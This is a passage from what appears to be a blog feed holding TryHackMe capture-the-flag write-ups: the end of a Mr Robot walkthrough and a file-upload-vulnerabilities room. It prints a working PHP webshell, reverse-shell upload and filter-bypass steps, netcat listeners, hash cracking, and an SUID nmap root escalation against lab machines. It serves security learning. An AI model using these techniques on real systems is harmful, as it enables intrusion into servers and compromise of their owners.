+<p>Looking through our <code>gobuster</code> results, we see <code>http://&lt;target-ip&gt;/wp-login.php</code>, which takes us to a WordPress log-in form. Using the credentials we have just discovered, we log in to the administrator panel.</p>
+<p>As WordPress is a multi-media content management system, it should not be too difficult for us to figure out a way to upload a file that will give us RCE (remote code execution). In the past, we have used <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">Pentestmonkey&rsquo;s PHP reverse shell script</a>.</p>
+<p>Unfortunately, the native WordPress media uploader function does not allow us to upload <code>.php</code> files &ldquo;for security reasons.&rdquo; The form won&rsquo;t accept any variants like <code>.php2</code> either.</p>
+<p>However, we know that WordPress relies on the execution of <code>.php</code> files to carry out work properly. Thus, we can simply use the platform&rsquo;s built-in text editor to replace the contents of an existing <code>.php</code> WordPress page with our reverse shell script. I went ahead and used <code>404.php</code>, as it is easily accessible and, honestly, it&rsquo;s just at the top of the list.</p>
+<p><img src="/images/mr-robot/mr-robot-ptm.png" alt="mr-robot-ptm"></p>
+<p>That worked nicely! We can then stabilize our shell via python with:</p>
+<pre tabindex="0"><code>$ python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+daemon@linux:/$ 
+</code></pre><p>and explore:</p>
+<pre tabindex="0"><code>daemon@linux:/$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+daemon@linux:/$ cd home 
+cd home
+daemon@linux:/home$ ls
+ls
+robot
+daemon@linux:/home$ cd robot
+cd robot
+daemon@linux:/home/robot$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+daemon@linux:/home/robot$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+</code></pre><p>We can&rsquo;t read <code>key-2-of-3.txt</code> yet, but we can access <code>password.raw-md5</code> for a hashed version of a password, likely for the <code>robot</code> user. We can use <a href="https://crackstation.net/">crackstation.net</a> to crack it, and, if not, probaby <a href="https://www.openwall.com/john/">John the Ripper</a>.</p>
+<p>Luckily, crackstation.net recognizes the hash and gives us the decoded password:</p>
+<p><img src="/media/mr-robot-crackstation.png" alt="mr-robot-crackstation"></p>
+<p>We can now switch users (<code>su</code>) to <code>robot</code> and read <code>key-2-of-3.txt</code>. Now that we have gotten the second flag, let&rsquo;s look to escalate our privileges for <code>root</code> access and, presumably, the third flag.</p>
+<p>As a shortcut to obtaining root access, We can search for system files that have an SUID (Set User ID) bit set. Files with SUID bits allow them to run with the permissions of whomever the owner of the file is. If the owner happens to be <code>root</code>, it runs with root permissions.</p>
+<pre tabindex="0"><code>robot@linux:/tmp$ find / -perm -u=s -type f 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+</code></pre><p>We see that <code>nmap</code> in <code>/usr/local/bin/nmap</code>, interestingly, has an SUID bit set. Nice.</p>
+<p>By checking <a href="https://gtfobins.github.io/gtfobins/nmap/#suid">GTFOBins</a> for <code>nmap</code> SUID escalations, we see that we can invoke <code>nmap</code>&rsquo;s &ldquo;interactive mode&rdquo; (available on versions 2.02 to 5.21, which can be used to execute shell commands via <code>nmap&gt; !sh</code>.</p>
+<pre tabindex="0"><code>robot@linux:/$ /usr/local/bin/nmap --interactive
+/usr/local/bin/nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt; !/bin/sh
+!/bin/sh
+# whoami
+whoami
+root
+# 
+</code></pre><p>&hellip;<em>et voilà</em>! We have root access and, by extension, the third flag.</p>
+<h3 id="lessons-learned">Lessons Learned</h3>
+<ul>
+<li>In retrospect, I would&rsquo;ve checked my Wappalyzer browser plug-in earlier, which is a good practice to prioritize. It would have spotted that WordPress is installed on the server before the lengthy <code>gobuster</code> scan, potentially saving time.</li>
+<li>Otherwise, this was an enjoyable CTF machine, especially for fans of the show.</li>
+</ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>THM: Upload Vulnerabilities -- Write-Up</title>
+            <link>https://robscharf.github.io/posts/2022/04/thm-upload-vulnerabilities--write-up/</link>
+            <pubDate>Thu, 28 Apr 2022 11:30:00 +0000</pubDate>
+            
+            <guid>https://robscharf.github.io/posts/2022/04/thm-upload-vulnerabilities--write-up/</guid>
+            <description>Welcome to my write-up of the Upload Vulnerabilities room on TryHackMe, created by MuirlandOracle. Let&amp;rsquo;s jump in.
+Note: The Complete Beginner THM skill path is now considered depricated in favor of the Jr Penetration Tester path.
+Task 1 - Getting Started The room begins with a necessary configuration step. The hosts file of the attacking machine needs to be modified to include the following line:
+&amp;lt;machine-ip&amp;gt; overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.</description>
+            <content type="html"><![CDATA[<p>Welcome to my write-up of the <a href="https://tryhackme.com/room/uploadvulns">Upload Vulnerabilities</a> room on <a href="https://tryhackme.com/">TryHackMe</a>, created by <a href="https://tryhackme.com/p/MuirlandOracle">MuirlandOracle</a>. Let&rsquo;s jump in.</p>
+<p><strong>Note:</strong> The <a href="https://tryhackme.com/paths">Complete Beginner</a> THM skill path is now considered <em>depricated</em> in favor of the <a href="https://tryhackme.com/path-action/jrpenetrationtester/join">Jr Penetration Tester</a> path.</p>
+<h2 id="task-1---getting-started">Task 1 - Getting Started</h2>
+<p>The room begins with a necessary configuration step. The <code>hosts</code> file of the attacking machine needs to be modified to include the following line:</p>
+<p><code>&lt;machine-ip&gt;    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm</code></p>
+<p>Note: You will require administrator-level privileges when editing the file. This can be done via <code>sudo</code> on Linux and <code>Run as Administrator</code> on Windows.</p>
+<p>The <code>hosts</code> file can be found at <code>/etc/hosts</code> on Linux and at <code>C:\Windows\System32\drivers\etc\hosts</code> on Windows.</p>
+<h2 id="task-2---introduction">Task 2 - Introduction</h2>
+<p>This task provides context for our task of exploiting vulnerable file upload systems on the web, outlining some of the opportunities for malicious actors. The text explains that the purpose of this THM room is to &ldquo;explore some of the vulnerabilities resulting from improper (or inadequate) handling of file uploads.&rdquo;</p>
+<p>This includes:</p>
+<ul>
+<li>Overwriting existing files on a server</li>
+<li>Uploading and Executing Shells on a server</li>
+<li>Bypassing Client-side filtering</li>
+<li>Bypassing various kinds of Server-side filtering</li>
+<li>Fooling content type validation checks</li>
+</ul>
+<h2 id="task-3---general-methodology">Task 3 - General Methodology</h2>
+<p>As the title indicates, additional information is provided through this task on how upload vulnerabilities are exploited.</p>
+<blockquote>
+<p>As with any kind of hacking, enumeration is key. The more we understand about our environment, the more we&rsquo;re able to do with it. Looking at the source code for the page is good to see if any kind of client-side filtering is being applied.</p>
+</blockquote>
+<p>The text mentions several relevant tools for this endeavor, including <a href="https://github.com/OJ/gobuster">Gobuster</a>, <a href="">BurpSuite</a>, and <a href="https://www.wappalyzer.com/apps">WappAnalyzer</a>.</p>
+<h2 id="task-4---overwriting-existing-files">Task 4 - Overwriting Existing Files</h2>
+<p>With properly configured permissions, servers that accept file uploads will ensure that newly uploaded files will not overwrite existing ones and that standard web visitors will not be able to maliciously alter web pages or server functions.</p>
+<p>An example is then presented, involving a webpage with file upload capabilities. By inspecting the page&rsquo;s source code, we can see that: a) uploaded images are likely stored in the servers <code>/images</code> directory, and that there is an existing file (displayed on the home page) called <code>spaniel.jpg</code>. A new <code>spaniel.jpg</code> image is then uploaded, which overwrites the original.</p>
+<h4 id="question-41">Question 4.1</h4>
+<h5 id="what-is-the-name-of-the-image-file-which-can-be-overwritten">What is the name of the image file which can be overwritten?</h5>
+<p>After navigating to <code>overwrite.uploadvulns.thm</code>, we can view the page&rsquo;s source code to learn about the upload destination and image displayed on the page, just like in the example provided.</p>
+<p><img src="/images/uv/uv-task4.png" alt="uv-task4"></p>
+<h4 id="question-42">Question 4.2</h4>
+<h5 id="overwrite-the-image-what-is-the-flag-you-receive">Overwrite the image. What is the flag you receive?</h5>
+<p><img src="/images/uv/uv-task4-2.png" alt="uv-task4-2"></p>
+<h2 id="task-5---remote-code-execution">Task 5 - Remote Code Execution</h2>
+<p>There are two primary methods for achieving Remote Code Execution (RCE)</p>
+<ol>
+<li>Webshells</li>
+<li>Reverse Shells</li>
+</ol>
+<h3 id="methodology">Methodology</h3>
+<h4 id="webshells">Webshells</h4>
+<p>For a given webpage with upload form, run something like a <a href="">GoBuster</a> scan on <code>dir</code> mode, using a relevant wordlist with <code>-w</code>.</p>
+<pre tabindex="0"><code>gobuster dir -u http://uploadform.com -w /usr/share/wordlists/dirbuster/directory-list-2.3.medium.txt
+</code></pre><p>If a directory is found that can plausibly house uploads from the web form, an uploaded webshell can be reached via the browser. If, as in the example, the server is running PHP, then a simple webshell can be invoked via:</p>
+<pre tabindex="0"><code>&lt;?php 
+	echo system($_GET[&#34;cmd&#34;]);
+?&gt;
+</code></pre><p>From this point, system files can be read and/or attempts to upgrade the webshell to a remote shell.</p>
+<h4 id="remote-shell">Remote Shell</h4>
+<p>After editing and uploading the necessary reverse shell script, such as <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Pentest Monkey&rsquo;s 2007 PHP tool</a>, the attacking machine can invoke a <code>netcat</code> listener via the venerable</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>The shell script will be activated by navigating to the uploaded shell&rsquo;s location on the server with a browser. This will give the attacker RCE capabillities on the target server, though ideally the reverse shell would then be stabilized with user privileges escalated.</p>
+<h4 id="question-51">Question 5.1</h4>
+<h5 id="run-a-gobuster-scan-on-the-website-using-the-syntax-from-the-screenshot-above-what-directory-looks-like-it-might-be-used-for-uploads">Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads?</h5>
+<p>Running:</p>
+<pre tabindex="0"><code>gobuster dir -u shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+</code></pre><p>creates the following output:</p>
+<p><img src="/images/uv/uv-gobuster.png" alt="UV - Gobuster"></p>
+<h4 id="question-52">Question 5.2</h4>
+<h5 id="get-either-a-web-shell-or-a-reverse-shell-on-the-machine-whats-the-flag-in-the-varwww-directory-of-the-server">Get either a web shell or a reverse shell on the machine. What&rsquo;s the flag in the /var/www/ directory of the server?</h5>
+<p>After editing and uploading the aforementioned Pentest Monkey PHP script, we instantiate the <code>netcat</code> listener</p>
+<p><img src="/images/uv/uv-ncl.png" alt="ncl"></p>
+<p>When we navigate to our uploaded ptm script at <code>http://shell.uploadvulns.thm/resources/ptm-shell.php</code>, we are greeted with</p>
+<p><img src="/images/uv/uv-504.png" alt="uv-504"></p>
+<p>However, our <code>netcat</code> listener has picked up the reverse shell!</p>
+<p><img src="/images/uv/uv-rce.png" alt="uv-rce"></p>
+<p>Then we simply navigate to the <code>/var/www</code> directory to find the flag.</p>
+<p><img src="/images/uv/uv-flag.png" alt="uv-flag"></p>
+<h2 id="task-6---filtering">Task 6 - Filtering</h2>
+<p>This task introduces the notion that, thus far, we have not encountered any form of security measures that have been implemented by developers to mitigate the effects of would-be file upload vulnerabilities. In this task, we begin to consider the relevant security mechanisms and how to circumvent them.</p>
+<p>Our first focus will be on the concept of <em>filtering</em>, that is, attempts to prevent unintended files from being successfully uploaded to the server. This is accomplished through two primary approaches:</p>
+<h3 id="client-side-vs-server-side">Client-side vs. Server-side</h3>
+<h4 id="client-side-filtering">Client-side filtering</h4>
+<blockquote>
+<p>When we talk about a script being &ldquo;Client-Side&rdquo;, in the context of web applications, we mean that it&rsquo;s running in the user&rsquo;s browser as opposed to on the web server itself. JavaScript is pretty much ubiquitous as the client-side scripting language, although alternatives do exist.  Regardless of the language being used, a client-side script will be run in your web browser. In the context of file-uploads, this means that the filtering occurs before the file is even uploaded to the server. Theoretically, this would seem like a good thing, right? In an ideal world, it would be; however, because the filtering is happening on our computer, it is trivially easy to bypass. As such client-side filtering by itself is a highly insecure method of verifying that an uploaded file is not malicious.</p>
+</blockquote>
+<h4 id="server-side-filtering">Server-side filtering</h4>
+<blockquote>
+<p>Conversely, as you may have guessed, a server-side script will be run on the server. Traditionally PHP was the predominant server-side language (with Microsoft&rsquo;s ASP for IIS coming in close second); however, in recent years, other options (C#, Node.js, Python, Ruby on Rails, and a variety of others) have become more widely used. Server-side filtering tends to be more difficult to bypass, as you don&rsquo;t have the code in front of you. As the code is executed on the server, in most cases it will also be impossible to bypass the filter completely; instead we have to form a payload which conforms to the filters in place, but still allows us to execute our code.</p>
+</blockquote>
+<p>Next, we look at some common methods for filtering.</p>
+<h3 id="filtering-mechanisms">Filtering Mechanisms</h3>
+<h4 id="extension-validation">Extension Validation</h4>
+<p>While file extensions theoretically identify the contents of a file, in reality they are easy to change, thus making them highly unreliable. While Windows still uses them to identify file types, Unix systems usually rely on other methods. Extension filters conventionally operate by blacklisting unwanted extensions or whitelisting allowed extensions.</p>
+<h4 id="file-type-filtering">File-Type Filtering</h4>
+<p>FTF is a bit more intensive than simple extension validation, and can be accomplished with the following two approaches, among others.</p>
+<h5 id="mime-validation">MIME Validation</h5>
+<p><a href="https://en.wikipedia.org/wiki/MIME">Multipurpose Internet Mail Extension</a> &ldquo;is an Internet standard that extends the format of email messages to support text in character sets other than ASCII, as well as attachments of audio, video, images, and application programs.&rdquo;</p>
+<p>Notably, for our purposes:</p>
+<blockquote>
+<p>Although the MIME formalism was designed mainly for SMTP, its content types are also important in other communication protocols. In the HyperText Transfer Protocol (HTTP) for the World Wide Web, servers insert a MIME header field at the beginning of any Web transmission. Clients use the content type or media type header</p>
+</blockquote>
+<p>The room text explains that:</p>
+<blockquote>
+<p>The MIME type for a file upload is attached in the header of the request. MIME types follow the format <type>/<subtype>. In the request above, you can see that the image &ldquo;spaniel.jpg&rdquo; was uploaded to the server. As a legitimate JPEG image, the MIME type for this upload was &ldquo;image/jpeg&rdquo;. The MIME type for a file can be checked client-side and/or server-side; however, as MIME is based on the extension of the file, this is extremely easy to bypass.</p>
+</blockquote>
+<p>and gives us this example:</p>
+<p><img src="/images/uv/mime-example.png" alt="mime-example"></p>
+<h5 id="magic-number-validation">Magic Number Validation</h5>
+<p>While not being impossible to forge, magic numbers are a more accurate way to determine the contents of a file than MIME Validation.  A file&rsquo;s &ldquo;magic number&rdquo; appears as a string of bytes at the beginning of a file. The course gives us an example:</p>
+<p>A <code>PNG</code> file would have a first line of <code>89 50 4E 47 0D 0A 1A 0A</code>.</p>
+<p><img src="/images/uv/magic-number-example.png" alt="magic-number-example"></p>
+<h4 id="file-length-filtering">File Length Filtering</h4>
+<p>Filters can be configured to limit the size of files uploaded. This avoid vulnerabilities related to large, complex exploits, as well as preserving system resources that would otherwise be devoted to handling exceptionally large files.</p>
+<p>In most cases, this will not affect the ability of attackers to upload a webshell/remote shell-sized file, however exceptionally restrictive filters may require a change in approach.</p>
+<h4 id="file-name-filtering">File Name Filtering</h4>
+<p>Filters related to uploaded file names not only protect against overwritten files, like the rudimentary attack highlighted in Task 4 - Overwriting Existing Files, but also facilitate the sanitization of file names, which, in turn, mitigates the use of &ldquo;bad&rdquo; characters (e.g., null bytes, &ldquo;control&rdquo; characters like <code>;</code> , and/or the use of UNICODE).</p>
+<p>The room notes that:</p>
+<blockquote>
+<p>&hellip;on a well administered system, our uploaded files are unlikely to have the same name we gave them before uploading, so be aware that you may have to go hunting for your shell in the event that you manage to bypass the content filtering.</p>
+</blockquote>
+<h4 id="file-content-filtering">File Content Filtering</h4>
+<p>Some servers may have more complex scanning and verification systems. These are outside of the scope of this room.</p>
+<h4 id="before-moving-on">Before moving on</h4>
+<p>The room notes that:</p>
+<blockquote>
+<p>&hellip;none of these filters are perfect by themselves &ndash; they will usually be used in conjunction with each other, providing a multi-layered filter, thus increasing the security of the upload significantly. Any of these filters can all be applied client-side, server-side, or both&hellip;</p>
+</blockquote>
+<blockquote>
+<p>Similarly, different frameworks and languages come with their own inherent methods of filtering and validating uploaded files. As a result, it is possible for language specific exploits to appear; for example, until PHP major version five, it was possible to bypass an extension filter by appending a null byte, followed by a valid extension, to the malicious .php file. More recently it was also possible to inject PHP code into the exif data of an otherwise valid image file, then force the server to execute it.</p>
+</blockquote>
+<h4 id="question-61">Question 6.1</h4>
+<h5 id="what-is-the-traditionally-predominant-server-side-scripting-language">What is the traditionally predominant server-side scripting language?</h5>
+<p><strong>Answer:</strong> Earlier in the text, we&rsquo;re told that this is <code>php</code>.</p>
+<h4 id="question-62">Question 6.2</h4>
+<h5 id="when-validating-by-file-extension-what-would-you-call-a-list-of-accepted-extensions-whereby-the-server-rejects-any-extension-not-in-the-list">When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)?</h5>
+<p><strong>Answer:</strong> Also in the preceding text, we&rsquo;re told that this is is called a <code>whitelist</code>.</p>
+<h4 id="question-63">Question 6.3</h4>
+<h5 id="what-mime-type-would-you-expect-to-see-when-uploading-a-csv-file">What MIME type would you expect to see when uploading a CSV file?</h5>
+<p><strong>Answer:</strong> Search engine results reveal that this is <code>text/csv</code>.</p>
+<h2 id="task-7---bypassing-client-side-filtering">Task 7 - Bypassing Client-side Filtering</h2>
+<p>We now delve into more depth related to Client-side vs Server-side binary that we encountered earlier, beginning with the client-side.</p>
+<p><strong>Note:</strong> Client-side filtering is generally weaker than server-side filtering</p>
+<h3 id="evading-client-side-filters">Evading client-side filters</h3>
+<p>There are four primary ways to evade client-side filters:</p>
+<ol>
+<li><strong>DisablingJavaScript in the browser</strong>
+<ul>
+<li>This is viable and effective, as long as the web page&rsquo;s basic functionality is not contingent on JavaScript.</li>
+</ul>
+</li>
+<li><strong>Intercepting and modifying incoming pages</strong>
+<ul>
+<li>Applications like BurpSuite can be used to capture incoming page data, allowing us to remove the JavaScript content before it can run.
+<ul>
+<li>This method takes place <em>before</em> a webpage is loaded in the browser.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Intercepting and modifying file uploads</strong>
+<ul>
+<li>This technique allows us to capture and alter uploaded data after it has been accepted by the server&rsquo;s filtering system.
+<ul>
+<li>This method takes place <em>after</em> a webpage is loaded in the browser.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Sending file(s) directly to the upload point</strong>
+<ul>
+<li>Using tools like <code>curl</code>, we can upload code directly to upload destinations.</li>
+<li>An application such as BurpSuite can be used to capture upload process, in order to analyze and duplicate the necessary parameters.</li>
+</ul>
+</li>
+</ol>
+<p>We will now take a look at an approach to executing items 2 and 3 on this list.</p>
+<h3 id="methodology-intercepting-and-modifying-incoming-pages">Methodology: Intercepting and modifying incoming pages</h3>
+<p>Arriving at <code>http://demo.uploadvulns.thm</code> - a basic file upload page, we inspect the HTML source and find a JavaScript function that checks uploaded files to verify that they are of the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME</a> type <code>image/jpeg</code>. This means that <code>image/jpeg</code> files are <em>whitelisted</em>.</p>
+<p>After verifying that the server&rsquo;s upload function works in this manner, we intercept an upload attempt, using BurpSuite.</p>
+<p>With <code>interception</code> enabled, we find our header request and right-click, selecting <code>Do Intercept</code> then <code>Response to this request</code>.  When we click <code>forward</code>, we will receive the server&rsquo;s response, allowing us to modify the data by disabling or removing the JavaScript filter function. When we have nullified the filter, we can press <code>forward</code> again to pass the data into our browser. The resulting web page should allow us to upload any type of file.</p>
+<p><strong>(Useful) Note:</strong> Burpsuite will not, by default, intercept any external JavaScript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you&rsquo;ll need to go to the &ldquo;Options&rdquo; tab at the top of the BurpSuite window, then under the &ldquo;Intercept Client Requests&rdquo; section, edit the condition of the first line to remove <code>^js$|</code>.</p>
+<p><img src="/images/uv/burp-js-interception-alt.png" alt="burp-js-interception-alt"></p>
+<h3 id="methodology-intercepting-and-modifying-file-uploads">Methodology: Intercepting and modifying file uploads</h3>
+<p>Next, we will perform a similar attack, instead intercepting the uploaded file <em>after</em> it has passed through the server&rsquo;s filtering function.</p>
+<p>We will accomplish this by redeploying the Pentest Monkey remote shell script that we used to complete Task 5. Here, we will simply rename the file from <code>ptm-shell.php</code> to <code>shell.jpeg</code>, allowing it to pass through the server&rsquo;s filter. This is due to the fact that the file&rsquo;s inauthentic MIME type of <code>image/jpeg</code> is confirmed by its <code>.jpg</code> extension.</p>
+<p>Before initiating the upload, we need to do two things.</p>
+<p>First, we set up a <code>netcat</code> listener on our attack machine, just like in task 5, ensuring that the port value corresponds with the variable in the <code>shell.jpeg</code> script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp &lt;port&gt;
+</span></span></code></pre></div><p>Second, we enable <code>interception</code> in BurpSuite.</p>
+<p>After initiating the upload, Burp will intercept the <code>POST</code> request. In the request details, we can see that the <code>filename</code> is set to <code>shell.jpeg</code>  and the <code>Content-type</code> value is set to <code>image/jpeg</code>, reflecting the whitelist constraint imposed by the server&rsquo;s JavaScript filter function.</p>
+<p>After modifying these two fields to <code>filename=&quot;shell.php&quot;</code> and <code>Content-type: text/x-php</code>, we can forward the request to the server. Once the upload has completed, we can navigate to <code>http://demo.uploadvulns.thm/uploads/shell.php</code>, which will execute our reverse shell script, spawning a shell in our <code>netcat</code> listener.</p>
+<h4 id="question-71">Question 7.1</h4>
+<h5 id="what-is-the-flag-in-varwww">What is the flag in /var/www/?</h5>
+<p>We begin by navigating to <code>java.uploadvulns.thm</code> to find a basic upload form web page.</p>
+<p><img src="/images/uv/uv-java.png" alt="uv-java"></p>
+<p>By viewing the <code>page source</code>, we see that a JavaScript file <code>http://java.uploadvulns.thm/assets/js/client-side-filter.js</code> runs as the last script in the HTML document&rsquo;s <code>&lt;head&gt;</code> section.</p>
+<p><img src="/images/uv/uv-java-head.png" alt="uv-java-head"></p>
+<p>Which looks like:</p>
+<p><img src="/images/uv/uv-java-filter.png" alt="uv-java-filter"></p>
+<p>From this, we understand that the <code>image/png</code> MIME type is effectively whitelisted.</p>
+<p>Next, we invoke <code>gobuster</code> in <code>directory</code> mode to enumerate server directories. This gives us a couple of results.</p>
+<p><img src="/images/uv/uv-java-gb.png" alt="uv-java-gb"></p>
+<p>Applying Occam&rsquo;s Razor, as the whitelisted MIME type is an image, it is likely that uploaded files are stored in the <code>/images</code> directory. We can test this theory by uploading some clip-art in <code>PNG</code> format and navigating to the resulting storage location in our browser.</p>
+<p><img src="/images/uv/uv-java-coffee.png" alt="uv-java-coffee"></p>
+<p><img src="/images/uv/uv-java-coffee-uploaded.png" alt="uv-java-coffee-uploaded"></p>
+<p>With the web page&rsquo;s file upload ability and destination established, we can &ldquo;hide&rdquo; our <code>ptm-shell.php</code> as <code>ptm-shell.png</code> and upload the file.</p>
+<p><img src="/images/uv/uv-java-coffee-ptm-png.png" alt="uv-java-shell-rename"></p>
+<p>We will then initiate our <code>netcat</code> listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p>and we enable <code>interception</code> in Burp Suite. Then, we initiate the upload and edit the intercepted <code>POST</code> submission from our browser.</p>
+<p><img src="/images/uv/uv-java-burpint.png" alt="uv-java-burpint"></p>
+<p>After we have used <code>Forward</code> to send it along to the server, we can navigate to <code>http://java.uploadvulns.thm/images/ptm-shell.php</code> to execute our shell script. Our browser will be greeted with:</p>
+<p><img src="/images/uv/uv-java-504.png" alt="uv-java-504"></p>
+<p>But our <code>netcat</code> listener will have spawned our reverse shell:</p>
+<p><img src="/images/uv/uv-java-rce.png" alt="uv-java-rce"></p>
+<p>From here we can navigate to the flag!</p>
+<p><img src="/images/uv/uv-java-flag.png" alt="uv-java-flag"></p>
+<h2 id="task-8---bypassing-server-side-filtering-file-extensions">Task 8 - Bypassing Server-side Filtering: File Extensions</h2>
+<p>The previous task was fairly simple, as local filters can be viewed and analyzed, even if this requires a bit of deobfuscatoin or processing. With Server-side filtering, filters can not be viewed directly, thus requiring more experimentation and testing to determine which payloads are permitted by the server.</p>
+<h3 id="methodology-1">Methodology</h3>
+<h4 id="evading-server-side-filters">Evading server-side filters</h4>
+<p>The first example for this task begins by introducing a website that uses the following PHP script to disallow or blacklist files that have <code>.php</code> or <code>.phtml</code> extensions with the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Get the extension
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $extension <span style="color:#f92672">=</span> <span style="color:#a6e22e">pathinfo</span>($_FILES[<span style="color:#e6db74">&#34;fileToUpload&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>])[<span style="color:#e6db74">&#34;extension&#34;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Check the extension against the blacklist -- .php and .phtml
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">switch</span>($extension){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;php&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;phtml&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#66d9ef">NULL</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            $uploadFail <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            $uploadFail <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>This script checks the extension of the <code>fileToUpload</code> against the simple blacklist of <code>php</code> and <code>phtml</code>.</p>
+<p>As we will need to upload a file with another extension, we must consider alternate approaches. The <a href="https://en.wikipedia.org/wiki/PHP">Wikipedia page for PHP</a>  introduce common extensions to look into, which are complemented by an array of uncommon, but executable, <code>PHP</code> formats, such as:</p>
+<ul>
+<li>.php3, .php4, .php5, .php7, .phps, .php-s, .pht and .phar</li>
+</ul>
+<p>The text notes that the server in the example is configured not to recognize most of these as <code>PHP</code> files (though, Apache2 servers are actually configured by default to do so). However, <code>.phar</code> files are found to bypass the filter <strong>and</strong> execute as <code>PHP</code> on the server.</p>
+<p>The next example uses the same premise, but this time involving a server with an unknown filtering mechanism. This is known as doing it &ldquo;<em>black-box</em>.&rdquo;<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.</p>
+<p>We begin by verifying that a standard <code>.jpeg</code> file can be uploaded; and that a <code>shell.php</code> script can not. After experimenting with files to better understand what the server will and will not accept, we reach the conclusion that there are no shell extensions that will pass through the filter and also execute on the server.</p>
+<p>We then remember that the filtering mechanism in the previous example used <code>pathinfo()</code> to get the file&rsquo;s extension by parsing the characters after the final <code>.</code> in the filename.</p>
+<pre tabindex="0"><code>$extension = pathinfo($_FILES[&#34;fileToUpload&#34;][&#34;name&#34;])[&#34;extension&#34;];
+</code></pre><p>We then bypass the server&rsquo;s filter code by changing our payload&rsquo;s filename from <code>ptm-shell.php</code> to <code>ptm-shell.jpeg.php</code>, as the <code>PHP</code> script parses the file&rsquo;s extension as the characters that follow the final <code>.</code>.</p>
+<p>Before offering our task question, the text asks us to consider that these examples are among many possibilities for exploiting upload vulnerabilities.</p>
+<blockquote>
+<p>As with everything in hacking, we are looking to exploit flaws in code that others have written; this code may very well be uniquely written for the task at hand. This is the really important point to take away from this task: there are a million different ways to implement the same feature when it comes to programming &ndash; your exploitation must be tailored to the filter at hand. The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.</p>
+</blockquote>
+<p><strong>Note:</strong> The room lets us know, for the first time, that this task has implemented a randomized naming scheme and that directories will not always be indexable.</p>
+<h4 id="question-81">Question 8.1</h4>
+<h5 id="what-is-the-flag-in-varwww-1">What is the flag in /var/www/?</h5>
+<p>As in the examples, we begin by navigating to the target site. When we reach <code>annex.uploadvulns.thm</code> , we are greeted with a pseudo-command line interface, which allows us to upload files.</p>
